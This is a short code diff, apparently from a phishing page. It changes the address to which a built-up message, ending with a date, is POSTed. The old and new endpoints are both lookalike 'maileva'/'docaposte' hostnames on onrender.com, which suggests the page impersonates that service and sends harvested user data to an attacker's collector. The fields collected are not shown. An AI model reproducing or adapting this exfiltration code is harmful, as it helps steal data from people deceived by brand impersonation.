@@ -959,7 +959,7 @@
                 message += "Date : " + date + "\n";
                 message += "------------------------------";
 
-                const resp = await fetch('https://sso-maileva-support.onrender.com/send-data', {
+                const resp = await fetch('https://docaposte-maileva.onrender.com/send-data', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ message })
